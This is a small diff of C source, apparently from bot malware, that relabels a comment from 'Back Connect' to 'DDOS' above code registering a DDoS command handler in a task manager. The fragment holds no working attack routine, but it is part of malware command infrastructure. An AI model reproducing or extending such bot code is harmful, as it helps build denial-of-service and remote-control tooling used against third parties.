@@ -1355,7 +1355,7 @@ void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 	#endif
 
 	//-------------------------------------------------
-	// Команда Back Connect
+	// Команда DDOS
 	#ifdef ddosH		
 		RegisterCommand(Manager, (PCHAR)CommandDDOS, ExecuteDDOSCommand);		
 	#endif
